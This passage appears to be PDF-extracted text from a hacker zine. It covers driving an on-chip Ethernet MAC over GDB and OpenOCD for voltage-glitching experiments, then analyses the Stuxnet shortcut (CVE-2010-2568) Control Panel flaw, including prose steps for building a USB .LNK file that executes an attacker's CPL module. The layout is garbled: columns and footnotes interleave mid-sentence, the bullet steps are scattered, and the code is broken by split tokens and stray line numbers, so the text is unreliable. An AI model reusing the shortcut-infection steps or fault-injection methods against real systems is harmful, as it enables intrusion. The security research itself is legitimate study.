time bubble, thanks to this chip talking over an SPI
interface that can run at a flexible rate relative to
the USB clock.
At first I tried to apply this same technique to
Ethernet, using the ENC28J60, a 10baseT Ethernet
controller that speaks SPI. This is even particularly
easy to set up in tandem with a (non-underclocked)
Raspberry Pi, thanks to some handy device tree
overlays. This worked to a point, but the ENC28J60
proved to be less underclockable than my target mi-
crocontroller.
There aren’t many SPI Ethernet controllers to
choose from. I only know of the ’28J60 from Mi-
crochip and its newer siblings with 100baseT sup-
port. In this case, it was inconvenient that I was
dealing with two very different internal PHY designs
on each side of the now very out-of-spec Ethernet
link. I started making electrical changes, such as re-
moving the AC coupling transformers, which needed
somewhat different kludges for each type of PHY.
This was getting frustrating, and seemed to be lim-
iting the consistency of detecting a link successfully
at such weird clock rates.
Problem with Time Bubbles
Slow experiments repeat for days, and the experi-
ments are often made slower on purpose by under-
clocking, broadening the little glitch targets we hope
to peck at in order for the chip to release new secrets.
To whatever extent I can, I like to control the clock
frequency of a device under investigation. It helps
to vary at least one clock to understand which parts
of the system are driven by which clock sources. A
slower clock can reduce the complexity of the tools
you need for power analysis, accurate fault injection,
and bus tracing.
If we had a system with a fully static design
and a single clock, there wouldn’t be any limit
to the underclocking, and the system would follow
the same execution path even if individual clock
edges were delivered bi-weekly by pigeon. In real-
ity, systems usually have additional clock domains
driven by free-running oscillators or phase-locked
loops (PLLs). This system design can impose lim-
its on the practical amount of underclock you can
achieve before the PLL fails to lock, or a watchdog
timer expires before the software can make sufficient
progress. On the bright side, these individual limita-
tions can themselves reveal interesting information
about the system’s construction, and it may even
be possible to introduce timing-related glitches in-
tentionally by varying the clock speed.
These experiments create a bubble of alternate
time, warped to your experiment’s advantage. Any
protocol that traverses the boundary between un-
derclocked and real-time domains may need to be
30At this point, it seemed like it would be awfully
convenient if I could just use the exact same kind of
PHY on both sides of the link. I could have rewrit-
ten my glitch experiment request generator program
as a firmware for the same type of microcontroller,
but I preferred to keep the test code written in
Python on a roomy computer so I could prototype
changes quickly. These constraints pointed toward a
fun approach that I had not seen anyone try before.
Ethernet over GDB
When I’m designing anything, but especially when
I’m prototyping, I get a bit alarmed any time the de-
sign appears to have too many degrees of freedom.
It usually means I could trade some of those extra
freedoms for the constraints offered by an existing
component somehow, and save from reinventing all
the boring wheels.
The boring wheel I’d imagined here would have
been a firmware image that perhaps implements a
simple proxy that shuttles network frames and per-
haps link status information between the on-chip
Ethernet and an arbitrary SPI slave implementa-
tion. The biggest downside to this is that the SPI
interface would have to speak another custom pro-
tocol, with yet another chunk of code necessary
to bridge that SPI interface to something usable
like a Linux network tap. It’s tempting to imple-
ment standard USB networking, but an integrated
USB controller would ultimately use the same clock
source as the Ethernet PHY. It’s tempting to emu-
late the ENC28J60’s SPI protocol to use its exist-
ing Linux driver, but emulating this protocol’s quick
turnaround between address and data without get-
ting an FPGA involved seemed unlikely.
In this case, the microcontroller hardware was
already well-equipped to shuttle data between its
on-chip Ethernet MAC and a list of packet buffers
in main RAM. I eventually want a network device
in Linux that I can really hang out with, captur-
ing packets and setting up bridges and all. So, in
the interest of eliminating as much glue as possi-
ble, I should be talking to the MAC from some code
that’s also capable of creating a Linux network tap.
31i n t main ( void ) {
MAP_SysCtlMOSCConfigSet (SYSCTL_MOSC_HIGHFREQ) ;
g_ui32SysClock = MAP_SysCtlClockFreqSet ( (SYSCTL_XTAL_25MHZ |
4
SYSCTL_OSC_MAIN |
SYSCTL_USE_PLL |
6
SYSCTL_CFG_VCO_480) , 1 2 0 0 0 0 0 0 0 ) ;
2
8
10
12
14
16
18
20
PinoutSet ( true , f a l s e ) ;
MAP_SysCtlPeripheralEnable (SYSCTL_PERIPH_EMAC0) ;
MAP_SysCtlPeripheralReset (SYSCTL_PERIPH_EMAC0) ;
MAP_SysCtlPeripheralEnable (SYSCTL_PERIPH_EPHY0) ;
MAP_SysCtlPeripheralReset (SYSCTL_PERIPH_EPHY0) ;
while ( ! MAP_SysCtlPeripheralReady (SYSCTL_PERIPH_EMAC0) ) ;
MAP_EMACPHYConfigSet(EMAC0_BASE,
EMAC_PHY_TYPE_INTERNAL |
EMAC_PHY_INT_MDI_SWAP |
EMAC_PHY_INT_FAST_L_UP_DETECT |
EMAC_PHY_INT_EXT_FULL_DUPLEX |
EMAC_PHY_FORCE_10B_T_FULL_DUPLEX) ;
22
MAP_EMACReset(EMAC0_BASE) ;
24
26
MAP_EMACInit(EMAC0_BASE, g_ui32SysClock ,
EMAC_BCONFIG_MIXED_BURST | EMAC_BCONFIG_PRIORITY_FIXED,
8 , 8 , 0) ;
28
30
32
34
36
MAP_EMACConfigSet(EMAC0_BASE,
(EMAC_CONFIG_FULL_DUPLEX |
EMAC_CONFIG_7BYTE_PREAMBLE |
EMAC_CONFIG_IF_GAP_96BITS |
EMAC_CONFIG_USE_MACADDR0 |
EMAC_CONFIG_SA_FROM_DESCRIPTOR |
EMAC_CONFIG_BO_LIMIT_1024) ,
(EMAC_MODE_RX_STORE_FORWARD |
EMAC_MODE_TX_STORE_FORWARD ) , 0 ) ;
38
MAP_EMACFrameFilterSet (EMAC0_BASE, EMAC_FRMFILTER_RX_ALL) ;
40
init_dma_frames ( ) ;
42
44
46
48
MAP_EMACTxEnable(EMAC0_BASE) ;
MAP_EMACRxEnable(EMAC0_BASE) ;
while ( 1 ) {
capture_phy_regs ( ) ;
__asm__ v o l a t i l e ( " bkpt " ) ;
}
50 }
Figure 5. TM4C129x Firmware
32This is where GDB, OpenOCD, and the Rasp-
berry Pi really save the day. I thought I was go-
ing to be bit-banging the Serial Wire Debug (SWD)
protocol again on some microcontroller, then build-
ing up from there all of the device-specific goodies
necessary to access the memory and peripheral bus,
set up the system clocks, and finally do some ac-
tual internetworking. It involves a lot of tedious
reimplementation of things the semiconductor ven-
dor already has working in a different language or
a different format. But with GDB, we can make a
minimal Ethernet setup firmware with whatever li-
braries we like, let it initialize the hardware, then
inspect the symbols we need at runtime to handle
packets.
add some string matching code to the Python proxy,
using the Pi’s GPIOs to signal the results of catego-
rizing packets of interest. This signal itself won’t be
synchronized with the Ethernet traffic, but it was
perfect for use as context when generating synchro-
nized triggers on a separate FPGA.
You’re being awfully vague, I thought
there was a proof of concept here?
Okay, okay. Yes, I have one, and of course I’ll share
it here. But I did have a point; the whole process
turned out to be a lot more generic than I expected,
thanks to the functionality of OpenOCD and GDB.
The actual code I wrote is very specific to the SoC
I’m working with, but that’s because it reads like a
network driver split into a C and a Python portion.
If you’re interested in a flexibly-clocked Ether-
net adapter for your Raspberry Pi, or you’re hack-
ing at another network-connected device with the
same micro, perhaps my code will interest you as-is,
but ultimately I hope my humble PoC might inspire
you to try a similar technique with other micros and
peripherals.
At this point I can already hear some of you
groaning about how slow this must be. While this
debug bus won’t be smoking the tires on a 100baseT
switch any time soon, it’s certainly usable for experi-
mentation. In the specific setup I’ll be talking about
in more detail below, the bit-bang SWD bus runs at
about 10 megabits per second peak, which turns into
an actual sustained Ethernet throughput of around
130 kilobytes per second. It’s faster than many in-
ternet connections I’ve had, and for microcontroller
work it’s been more than enough.
There’s a trick to how this crazy network driver
is able to run at such blazingly adequate speeds.
Odds are if you’re used to slow on-chip debugging,
most of the delays have been due to slow round trips
in your communication with the debug adapter.
How bad this is depends on how low-level your de-
bug adapter protocol happens to be. Does it make
you schedule a USB transfer for every debug trans-
action? There goes a millisecond. Some adapters
are much worse, some are a little better. Thanks
to the Raspberry Pi 2 and 3 with their fast CPU
and memory-mapped GPIOs, an OpenOCD process
in userspace can bitbang SWD at rates competi-
tive with a standalone debug adapter. By elimi-
nating the chunky USB latencies we can hold con-
versations between hardware and Python code im-
pressively fast. Idle times between SWD transfers
are 10-50 microseconds when we’re staying within
OpenOCD, and as low as 150μs when we journey
all the way back to Python code.
After building up a working network interface,
it’s easy to go a little further to add debugging hooks
specific to your situation. In my voltage glitching
setup, I wanted some hardware to know in advance
when it was about to get a specific packet. I could
33Tiva GDBthernet
So the specific chip I’ve been working with is a 120
MHz ARM Cortex-M4F core with on-board Ether-
net, the TM4C129x, otherwise known as the Tiva-C
series from Texas Instruments. Luckily there’s al-
ready a nice open source project to support building
firmware for this platform with GCC. 17 The plat-
form includes some networking examples based on
the uIP and lwIP stacks. For our purposes, we need
to dig a bit lower. The on-chip Ethernet MAC uses
DMA both to transfer packet contents and to access
a queue made from DMA Descriptor structures.
On the Raspberry Pi side, we start with a shell
script proxy.sh that spawns an OpenOCD and
GDB process, and tells GDB to run gdb_net_-
host.py. Some platform-specific configuration for
OpenOCD tells it how to get to the processor and
which micro we’re dealing with. GDB provides quite
high-level access to parse expressions in the target
language, and the Python API wraps those results
nicely in data structures that mimic the native lan-
guage types. My current approach has been to use
this parsing sparingly, though, since it seems to
leak memory. Early on in gdb_net_host.py, we
scrape all the constants we’ll be needing from the
firmware’s debug symbols. (Figure 6.)
From here on, we’ll expect to chug through all
of the Raspberry Pi CPU cycles we can. There’s
no interrupt signaling back to the debugger, every-
thing has to be based on polling. We could poll for
Ethernet interrupts, but it’s more expedient to poll
the DMA Descriptor directly, since that’s the data
we actually want. Here’s how we receive Ethernet
frames and forward them to our tap device. (Fig-
ure 7.)
The transmit side is similar, but it’s driven by
the availability of a packet on the tap interface. You
can see the hooks for GPIO trigger outputs in Fig-
ure 8.
That’s just about all it takes to implement a
pretty okay network interface for the Raspberry Pi.
Attached you’ll find the few necessary but boring
tidbits I’ve left out above, like link state detection
and debugger setup. I’ve been pretty happy with
the results. This approach is even comparable in
speed to the ENC28J60 driver, if you don’t mind
the astronomical CPU load. I hope this trick in-
spires you to create weird peripheral mashups using
GDB and the Raspberry Pi. If you do, please be a
good neighbor and consider documenting your ex-
perience for others. Happy hacking!
This data structure is convenient enough to
access directly from Python when we’re shuttling
packets back and forth, but setting up the periph-
eral involves a boatload of magic numbers that I’d
prefer not to fuss with. We can mostly reuse ex-
isting library code for this. The main firmware file
gdbthernet.c uses a viscous wad of library calls to
set up all the hardware we need, before getting itself
stuck in a breakpoint loop, shown in Figure 5.
Everything in this file only needs to exist for
convenience. The micro doesn’t need any firmware
whatsoever, we could set up everything from GDB.
But it’s easier to reuse whatever we can. You may
have noticed the call to capture_phy_regs() above.
We have only indirect access to the PHY registers
via the Ethernet MAC, so it was a bit more conve-
nient to reuse existing library code for reading those
registers to determine the link state.
17 git
clone https://github.com/yuvadm/tiva-c
34i n f = gdb . s e l e c t e d _ i n f e r i o r ( )
2 num_rx = i n t ( gdb . parse_and_eval ( ’ s i z e o f g _ r x B u f f e r / s i z e o f g _ r x B u f f e r [ 0 ] ’ ) )
num_tx = i n t ( gdb . parse_and_eval ( ’ s i z e o f g _ t x B u f f e r / s i z e o f g _ t x B u f f e r [ 0 ] ’ ) )
4 g_phy_bmcr = i n t ( gdb . parse_and_eval ( ’ ( i n t )&g_phy . bmcr ’ ) )
g_phy_bmsr = i n t ( gdb . parse_and_eval ( ’ ( i n t )&g_phy . bmsr ’ ) )
6 g_phy_cfg1 = i n t ( gdb . parse_and_eval ( ’ ( i n t )&g_phy . c f g 1 ’ ) )
g_phy_sts = i n t ( gdb . parse_and_eval ( ’ ( i n t )&g_phy . s t s ’ ) )
8 r x _ s t a t u s = [ i n t ( gdb . parse_and_eval (
’ ( i n t )&g _ r x B u f f e r [%d ] . d e s c . u i 3 2 C t r l S t a t u s ’ % i ) ) f o r i i n r a n g e ( num_rx ) ]
10 rx_frame = [ i n t ( gdb . parse_and_eval (
’ ( i n t ) g _ r x B u f f e r [%d ] . frame ’ % i ) ) f o r i i n r a n g e ( num_rx ) ]
12 t x _ s t a t u s = [ i n t ( gdb . parse_and_eval (
’ ( i n t )&g _ t x B u f f e r [%d ] . d e s c . u i 3 2 C t r l S t a t u s ’ % i ) ) f o r i i n r a n g e ( num_tx ) ]
14 tx_count = [ i n t ( gdb . parse_and_eval (
’ ( i n t )&g _ t x B u f f e r [%d ] . d e s c . ui32Count ’ % i ) ) f o r i i n r a n g e ( num_tx ) ]
16 tx_frame = [ i n t ( gdb . parse_and_eval ( ’ ( i n t ) g _ t x B u f f e r [%d ] . frame ’ % i ) ) f o r i i n r a n g e ( num_tx ) ]
Figure 6. Fetching Debug Symbols
next_rx = 0
2
4
d e f rx_poll_demand ( ) :
# Rx P o l l Demand ( wake up MAC i f i t ’ s s u s p e n d e d )
i n f . write_memory ( 0 x400ECC08 , s t r u c t . pack ( ’<I ’ , 0xFFFFFFFF) )
6
8
10
12
d e f p o l l _ r x ( tap ) :
g l o b a l next_rx
s t a t u s = s t r u c t . unpack ( ’<I ’ , i n f . read_memory ( r x _ s t a t u s [ next_rx ] , 4 ) ) [ 0 ]
i f s t a t u s & ( 1 << 3 1 ) :
# Hardware s t i l l owns t h i s b u f f e r ; t r y l a t e r
return
14
if
16
18
20
22
24
26
28
30
s t a t u s & ( 1 << 1 1 ) :
p r i n t ( ’RX O v e r f l o w e r r o r ’ )
e l i f s t a t u s & ( 1 << 1 2 ) :
p r i n t ( ’RX Length e r r o r ’ )
e l i f s t a t u s & ( 1 << 3 ) :
p r i n t ( ’RX R e c e i v e e r r o r ’ )
e l i f s t a t u s & ( 1 << 1 ) :
p r i n t ( ’RX CRC e r r o r ’ )
e l i f ( s t a t u s & ( 1 << 8 ) ) and ( s t a t u s & ( 1 << 9 ) ) :
# Complete frame ( f i r s t and l a s t p a r t s ) , s t r i p 4−b y t e FCS
l e n g t h = ( ( s t a t u s >> 1 6 ) & 0x3FFF ) − 4
frame = i n f . read_memory ( rx_frame [ next_rx ] , l e n g t h )
i f VERBOSE:
p r i n t ( ’RX %r ’ % b i n a s c i i . b2a_hex ( frame ) )
tap . w r i t e ( frame )
else :
p r i n t ( ’RX unhandled s t a t u s %08x ’ % s t a t u s )
32
34
36
# Return t h e b u f f e r t o hardware , advance t o t h e n e x t one
i n f . write_memory ( r x _ s t a t u s [ next_rx ] , s t r u c t . pack ( ’<I ’ , 0 x80000000 ) )
next_rx = ( next_rx + 1 ) % num_rx
rx_poll_demand ( )
r e t u r n True
Figure 7. Ethernet Frame RX
351 next_tx = 0
tx_buffer_stuck_count = 0
3
d e f tx_poll_demand ( ) :
5
# Tx P o l l Demand ( wake up MAC i f i t ’ s s u s p e n d e d )
i n f . write_memory ( 0 x400ECC04 , s t r u c t . pack ( ’<I ’ , 0xFFFFFFFF) )
7
d e f p o l l _ t x ( tap ) :
9
g l o b a l next_tx
g l o b a l tx_buffer_stuck_count
11
s t a t u s = s t r u c t . unpack ( ’<I ’ , i n f . read_memory ( t x _ s t a t u s [ next_tx ] , 4 ) ) [ 0 ]
13
i f s t a t u s & ( 1 << 3 1 ) :
p r i n t ( ’TX w a i t i n g f o r b u f f e r %d ’ % next_tx )
15
tx_buffer_stuck_count += 1
i f tx_buffer_stuck_count > 5 :
17
gdb . e x e c u t e ( ’ run ’ )
update_phy_status ( )
19
tx_poll_demand ( )
return
21
tx_buffer_stuck_count = 0
23
i f not s e l e c t . s e l e c t ( [ tap . f i l e n o ( ) ] , [ ] , [ ] , 0 ) [ 0 ] :
return
25
frame = tap . r e a d ( 4 0 9 6 )
27
match_low = TRIGGER and frame . f i n d (TRIGGER_LOW) >= 0
match_high = TRIGGER and frame . f i n d (TRIGGER_HIGH) >= 0
29
31
33
35
i f VERBOSE:
p r i n t ( ’TX %r ’ % b i n a s c i i . b2a_hex ( frame ) )
i f match_low :
i f VERBOSE:
p r i n t ( ’− ’ ∗ 6 0 )
GPIO . ou tp ut (TRIGGER_PIN, GPIO .LOW)
37
39
41
43
45
47
49
i n f . write_memory ( tx_frame [ next_tx ] , frame )
i n f . write_memory ( tx_count [ next_tx ] , s t r u c t . pack ( ’<I ’ , l e n ( frame ) ) )
i n f . write_memory ( t x _ s t a t u s [ next_tx ] , s t r u c t . pack ( ’<I ’ ,
0 x80000000 | # DES0_RX_CTRL_OWN
0 x20000000 | # DES0_TX_CTRL_LAST_SEG
0 x10000000 | # DES0_TX_CTRL_FIRST_SEG
0 x00100000 ) ) # DES0_TX_CTRL_CHAINED
next_tx = ( next_tx + 1 ) % num_tx
i f match_high :
GPIO . ou tp ut (TRIGGER_PIN, GPIO . HIGH)
i f VERBOSE:
p r i n t ( ’+ ’ ∗ 6 0 )
51
53
tx_poll_demand ( )
r e t u r n True
Figure 8. Ethernet Frame TX
3614:08
Control Panel Vulnerabilities
by Geoff Chappell
CVE-2010-2568
Back in 2010, as what I then feared might be
“the last new work that I will ever publish,” I wrote
The CPL Icon Loading Vulnerability 18 about what
Microsoft called a Shortcut Icon Loading Vulnerabil-
ity. 19 You likely remember this vulnerability. It was
notorious for having been exploited by the Stuxnet
worm to spread between computers via removable
media. Just browsing the files on an infected USB
drive was enough to get the worm loaded and exe-
cuting.
You’d hope that Stuxnet’s trick has long been un-
derstood in detail by everyone who ever cared, but
let’s have a quick summary anyway. Among the
browsed files is a shortcut (.LNK) file that presents
as its target a Control Panel item whose icon is to
be resolved dynamically. Browsing the shortcut in-
duces Windows to load and execute the correspond-
ing CPL module to ask it which icon to show. This
may be all well and good if the CPL module ac-
tually is registered, so that its Control Panel items
would show when browsing the Control Panel. The
exploitation is simply that the target’s CPL module
is (still) not registered but is (instead) malware.
Chances are that you remember CVE-2010-2568
and its exploitation differently. After all, Microsoft
had it that the vulnerability “exists because Win-
dows incorrectly parses shortcuts” and is exploited
by “a specially crafted shortcut.” Some malware an-
alysts went further and talked of a “malformed .LNK
file.”
But that’s all rubbish! A syntactically valid .LNK
file for the exploitation can be created using nothing
but the ordinary user interface for creating a short-
cut to a Control Panel item. Suppose an attacker
has written malware in the form of a CPL module
that hosts a Control Panel item whose icon is to be
resolved dynamically. Then all the attacker has to
do at the attacker’s computer is as follows.
Years later, over drinks at a bar in the East Vil-
lage, I brought up this case to support a small provo-
cation that the computer security industry does not
rate the pursuit of detail as highly as it might—
or even as highly as it likes to claim. Thus did
I recently reread my 2010 article, which I always
was unhappy to have put aside in haste, and looked
again at what others had written. To my surprise—
or not, given that I had predicted “the defect may
not be properly fixed”—I saw that others had re-
visited the issue too, in 2015 while I wasn’t look-
ing. As reported by Dave Weinstein in Full details
on CVE-2015-0096 and the failed MS10-046 Stuxnet
fix, 20 Michael Heerklotz showed that Microsoft had
not properly fixed the vulnerability in 2010. Numer-
ous others jumped on the bandwagon of scoffing at
Microsoft for having needed a second go. I am writ-
ing about this vulnerability now because I think we
might do well to have a third look!
• First copy this CPL module to the USB drive;
Don’t get too excited, though. It’s not that
Microsoft’s second fix, of a DLL Planting Remote
Code Execution Vulnerability, 21 still hasn’t com-
pletely closed off the possibilities for exploitation.
I’m not saying that Microsoft needs a third attempt.
I will show, however, that the exploitation that mo-
tivated the second fix depends on some extraordi-
narily quirky behaviour that this second fix left in
place. It is not credibly retained for backwards com-
patibility. That it persists is arguably a sign that we
still have a long way to go for how the computer se-
curity industry examines software for vulnerabilities
and for how software manufacturers fix them.
• register this CPL module so that it will show
in the Control Panel;
• open the Control Panel and find the Control
Panel item; and,
• Ctrl-Shift drag this item to the USB drive to
create a .LNK file.
Call the result a “specially crafted shortcut” if
you want, but it looks to me like a very ordinary
shortcut created by very ordinary steps. When the
USB drive is browsed on the victim’s computer,
18 http://www.geoffchappell.com/notes/security/stuxnet/ctrlfldr.htm
19 MS10-046
and CVE-2010-2568
Enterprise, March 2015
21 MS15-020, CVE-2015-0096
20 HP
37attacker’s .LNK file on the USB drive is correctly
parsed to discover that it’s a shortcut to a Con-
trol Panel item that’s hosted by the attacker’s CPL
module on the USB drive. Though this CPL mod-
ule is not registered for execution as a CPL module
on the victim’s computer, it does get executed. The
cause of this unwanted execution is entirely that the
Control Panel is credulous that what is said to be a
Control Panel item actually is one. What the Con-
trol Panel was vulnerable to was not a parsing error
but a spoof. 22
Microsoft certainly understood this at the time,
for even though the words Control Panel do not
appear in Microsoft’s description of the vulnerabil-
ity (except in boilerplate directions for such things
as applying patches and workarounds), the essence
of the first fix was the addition to shell32.dll
of a routine that symbol files tell us is named
CControlPanelFolder::_IsRegisteredCPLApplet.
Control Panel Icons
This CControlPanelFolder class is the shell’s im-
plementation of the COM class that is creatable
from the Control Panel’s well-known CLSID. Asking
which icon to show for a Control Panel item starts
with a call to this class’ GetUIObjectOf method to
get an IExtractIcon interface to a temporary ob-
ject that represents the given item. Calling this in-
terface’s GetIconLocation method then gets direc-
tions for where to load the icon from.
The input to GetUIObjectOf is a binary pack-
aging of the item’s basic characteristics, which I’ll
refer to collectively as the item ID. The important
ones for our purposes are: a pathname to the CPL
module that hosts the item; an index for the item’s
icon among the module’s resources; and a display
name for the item. The case of interest is that when
the icon index is zero, the icon is not cached from
any prior execution of the CPL module, but is to
be resolved dynamically, i.e., by asking the CPL
module. Proceeding to GetIconLocation causes the
CPL module to be loaded, called and unloaded.
This is all by design. It’s a design with more
moving parts than some would like, especially for
just this one objective. But it fits the generality of
shell folders so that highly abstracted and widely
varying shell folders can present a broadly consis-
tent user interface, while meeting a particular goal
for the Control Panel. It’s what lets a Control Panel
item, or a shortcut to one, change its icon according
to the current state of whatever the item exists to
control.
I stress this because more than a few commenta-
tors blame the vulnerability on what they say was a
bad design decision decades ago to load icons from
DLLs, as if this of itself risks getting the DLL to
execute. What happens is instead much more spe-
cific. Though CPL modules are DLLs and do have
icons among their resources, the reason a CPL mod-
ule may get executed for its icon is not to get the
22 Although parser bugs have a special place in Pastor’s heart, it’s good to be reminded occasionally that not every bug is a
parser bug, and that there are other buggy things besides parsers!—PML
38icon but to ask explicitly which icon to get.
Note that I have not tied down who calls
GetUIObjectOf or where the item ID comes from.
The usual caller is SHELL32 itself, as a consequence
of opening the Control Panel, e.g., in the Windows
Explorer, to browse it for items to show. Each item
ID is in this case being fed back to the class, having
been produced by other methods while enumerating
the items. In Stuxnet’s exploit the caller is again
SHELL32, but in response to browsing a shortcut to
one Control Panel item. The item ID is in this case
parsed from a shortcut (.LNK) file. Another way the
call can come from within SHELL32 is automatically
when starting the shell if a Control Panel item has
been pinned to the Start Menu. The item ID is in
this case parsed from registry data. More generally,
the call can come from just about anywhere, and the
item ID can come from just about anywhere, too.
One thing is common to all these cases, however,
because the binary format of this item ID is docu-
mented only as being opaque to everyone but the
Control Panel. If everyone plays by the rules, any
item ID that the Control Panel’s GetUIObjectOf
ever receives can only have been obtained from some
earlier interaction with the Control Panel. (Though
not necessarily the same Control Panel!)
even though all the software that’s involved plays
by the rules. As hackers, we know very well that
not all software does play by the rules, and that
some deliberately makes mischief. That the format
of the item ID is not documented will not stop a
sufficiently skilled reverse engineer from figuring it
out, which opens up the extra risk that an item ID
may be confected. (Stick with me on this, because
we’ll do it ourselves later.)
Asking which icon to show for a Control Panel
item gives an object-lesson in how messy the
progress towards what we now think of as minimally
prudent validation can be. Not until Windows 2000
did the Control Panel implementation make even
the briefest check that an item ID it received was
syntactically plausible. Worse, even though Win-
dows NT 4.0 had introduced a second format, to
support Unicode, it differentiated the two without
questioning whether it had been given either. When
the check for syntax did come, it was only that the
item ID was not too small, and that the icon index
was within a supported range.
Checking that the module’s pathname and the
item’s display name, if present, were actually null-
terminated strings that lay fully within the received
data wasn’t even attempted until Windows 7. I say
attempted because this first attempt at coding it
was defective. A malformed item ID could induce
SHELL32 to read a byte from outside the item ID—
only as far as 10 bytes beyond, and thus unlikely
to access an invalid address, but outside nonethe-
less. Even a small bug in code for input validation
is surely not welcome, but what I want to draw at-
tention to is that this bug conspicuously was not
addressed by the fix of CVE-2010-2568. A serious
check of the supposed strings in the item ID came
soon, but not, as far as I know, until later in 2010
for Windows 7 SP1.
Please take this in for a moment. While Mi-
crosoft worked to close off the spoof by having
GetUIObjectOf check that the CPL module as
named in the item ID is one that can be allowed
to execute, Microsoft described the vulnerability as
a parsing error—yet did nothing about errors in pre-
existing code that checked the item ID for syntax!
Wouldn’t you think that if you’re telling the world
that the problem is a parsing error, then you’d want
to look hard into everything nearby that involves
any sort of parsing?
The suggestion is strong that Microsoft’s talk of
Input Validation
As security researchers, we’ve all seen this movie
before—in multiple re-runs, even. Among the lax
practices that were common once but which we now
regard as hopelessly naive is that a program trusts
what it reads from a file or a registry value, etc., on
the grounds that the storage was private to the pro-
gram or anyway won’t have gotten messed with. Not
very long ago, programs routinely didn’t even check
that such input was syntactically valid. Nowadays,
we expect programs to check not just the syntax of
their input but the meaning, so that they are not
tricked into actions for which the present provider
is not authorised (or ought to not even know how to
ask).
For the Control Panel, the risk is that even if
the item ID has the correct syntax what actually
gets parsed from it may be stale. The specified
CPL module was perhaps registered for execution
some time ago but isn’t now. Or, perhaps, it is still
registered, but only for some other user or on some
other computer. And this is just what can go wrong
23 I
wonder what would happen if programmers got in the habit of taking the right approach—pitchforks applied to the protocol
39a parsing error was only ever a sleight of hand. As
programmers, we’ve all written code with parsing
errors. So many edge cases! 23 To have such an er-
ror in your otherwise well-written code is only in-
evitable. Software is hand-crafted, after all. To talk
of a parsing error is to appeal to the critics’ recogni-
tion of fallibility. A parsing error can be the sort of
an easy slip-up that gets you a 99 instead of a 100
on a test.
Falling for a spoof, however, seems more like a
conceptual design failure. It’s only natural that Mi-
crosoft directed attention to one rather than the
other. My only question for Microsoft is how de-
liberate was the misdirection. Why so many se-
curity researchers went along with it, I won’t ever
know. This, too, is a conceptual failure—–and not
just mine. -1 instead of 0.
Perhaps this relaxed attitude was motivated just
by a general (and understandable) desire for the
least possible change. Perhaps there was a known
case that had to be supported for backwards com-
patibility. I can’t know either way, but what I hope
you’ve already woken to is the following contrast be-
tween rejection and sanitisation. To reject suspect
input may be more brutal than you need, but it has
the merit of certainty. The suspect input goes no
further, and any innocent caller should at least have
anticipated that you return an error. To “sanitise”
suspect input and proceed as if all will now be fine
is to depend on the deeper implementation—which,
as you already know, had not checked this input for
itself!
First Fix What Lies Beneath
Still, it’s a plus that fixing CVE-2010-2568 meant
not only getting the item ID checked ever so slightly
better for syntax, but also checking it for its mean-
ing, too. Checking, however, is only the start. What
do you do about a check that fails?
Were it up to me, thinking just of what I’d like
for my own use of my own computer, I’d have all
CControlPanelFolder methods that take an item
ID as input return an error if given any item ID
that specifies a CPL module that is not currently
registered. My view would be that even if the item
ID is only stale rather than confected (keep read-
ing!), then wherever or whenever the specified CPL
module is or was registered, it’s not registered now
for my use on this computer—and so it shouldn’t
show if I browsed the Control Panel. I’d rather not
accept it for any purpose at all, let alone run the
risk that it gets executed.
Microsoft’s view, whether for a good reason or
bad, was nothing like this firm. First, it regarded
the problem case as more narrow, not just that the
specified CPL module is not currently registered (so
that the item ID is at least stale, if not actually
faked), but also that the specified icon index is zero
(this being, we hope, the only route to unwanted ex-
ecution) and anyway only for GetUIObjectOf when
queried for an IExtractIcon interface. Second, the
fix didn’t reject but sanitised. 24 It let the problem
case through, but as if the icon index were given as By deeper implementation I mean to remind you
that GetUIObjectOf is just the entry point for ask-
ing which icon to show. There is still a long, long
way to go: first for the temporary object that sup-
plies the GetIconLocation method for the given
item; and then, though apparently only if the pre-
ceding stage has zero for the icon index, to the more
general support for loading and calling CPL mod-
ules. Moreover, this long, long way goes through old,
old code, with all the problems that can come from
that. To depend on any of it for fixing a bug, es-
pecially one that you know real-world attackers are
probing for edge cases, seems—at best—foolhardy.
To sense how foolhardy, let’s have some demon-
strations of where this deeper implementation can
go wrong. An attacker whose one goal is to see
if the first fix can be worked around would most
easily follow the execution from GetUIObjectOf
down. Many security researchers would follow, too—
perhaps mumbling that their lot is always to be re-
acting to the attackers and never getting ahead. One
way to get ahead is to study in advance as much of
the general as you can so that you’re better pre-
pared whenever you have to look into the specific.
This is why, when I examine what might go wrong
with trying to fix CVE-2010-2568 by letting sani-
tised input through to the deeper implementation,
I work in what you may think is the reverse of the
natural direction.
designers—to address the root cause of these edge cases. —PML.
24 When neighbors whose software you’d like to trust tell you proudly that they “sanitize” input and “fix” it, so that inputs
coming in as invalid would still be used—run. You’ll thank us later. —PML
40Loading and Calling
name and see how easily you come up with suitably
quirky behaviour. Of course, theoretical analysis
takes hours of intensive work, and often comes to
nothing. There’s a trade-off, but for investigating
possibly subtle interactions with complex software
the predictive power of theoretical analysis surely
pays off in the long run.
But enough of my pleas to the computer security
industry for investing more in studying Windows!
Let us get on with the demonstrations.
Where we look at first into the deeper implementa-
tion is therefore the general support for loading and
calling of CPL modules, but particularly of a CPL
module that hosts a Control Panel item whose icon
is to be resolved dynamically. For my 2010 article,
I presented such a simple example. 25
Whenever this CPL module is loaded, the first
call to its exported CPlApplet function produces a
message box that asks “Did you want me?”, and
whose title shows the CPL module’s pathname.
That much is done so that we can see when the
CPL module gets loaded. What makes this CPL
module distinctively of the sort we want to under-
stand is that when we call to CPlApplet for the
CPL_INQUIRE message, the answer for the icon in-
dex is zero.
Default File Extension?
First, remove the file
extension from the registry data. Open the Con-
trol Panel and see that the Test item no longer
shows. Close the Control Panel. Rename test.cpl
to test.dll. Open the Control panel and see that
there’s still no Test item. Evidently, neither .cpl
nor .dll is a default file extension for CPL mod-
ules. Close the Control Panel. Why did I have you
try this? Create path\test itself as any file you like,
even as a directory. Open the Control Panel. Oh,
now it executes test.dll!
Yes, if the pathname in the registry does not have
a file extension, the Control Panel will load and ex-
ecute a CPL module that has .dll appended, as if
.dll were a default file extension—–but only if the
extension-free name also exists as at least some sort
of a file-system object. Isn’t this weird?
Install
There are several ways to register a
CPL module for execution, but the easiest is done
through—–wait for it—–the registry. Save the CPL
module as test.cpl in some directory whose path,
for simplicity and definiteness, contains no spaces
and is not ridiculously long. Then create the follow-
ing registry value shown in Figure 9.
To test, open the Control Panel so that it shows
a list of items, not categories, and confirm that you
don’t just see an item named Test, but also see its
message box. Yes, our CPL module gets loaded and
executed just for browsing the Control Panel. In-
deed, it gets loaded and executed multiple times.
(Watch out for extra message boxes lurking behind
the Control Panel.) Though it’s not necessary for
our purposes, you might, for completeness, confirm
